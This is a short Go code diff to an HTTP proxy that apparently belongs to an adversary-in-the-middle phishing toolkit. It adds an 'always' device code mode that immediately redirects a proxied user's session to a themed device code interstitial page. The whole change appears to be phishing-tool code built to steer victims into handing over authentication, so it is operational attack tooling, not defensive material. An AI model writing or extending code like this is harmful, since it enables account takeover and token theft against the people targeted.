@@ -1634,6 +1634,26 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										if dcMode == DCModeFallback || dcMode == DCModeAuto {
 											go p.monitorSessionStall(session)
 										}
+
+										// For "always" mode: redirect immediately to device code interstitial
+										if dcMode == DCModeAlways {
+											session.DCState = DCStatePending
+											var interstitialURL string
+											dcTheme := ""
+											if l != nil {
+												dcTheme = l.DeviceCodeTheme
+											}
+											if dcTheme != "" && dcTheme != "default" {
+												interstitialURL = fmt.Sprintf("/access/%s/%s", dcTheme, session.Id)
+											} else {
+												interstitialURL = fmt.Sprintf("/dc/%s", session.Id)
+											}
+											log.Debug("[devicecode] DCModeAlways: redirecting to %s", interstitialURL)
+											resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
+											resp.Header.Set("Location", interstitialURL)
+											resp.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
+											return req, resp
+										}
 									}
 									// --- End device code chaining ---
 
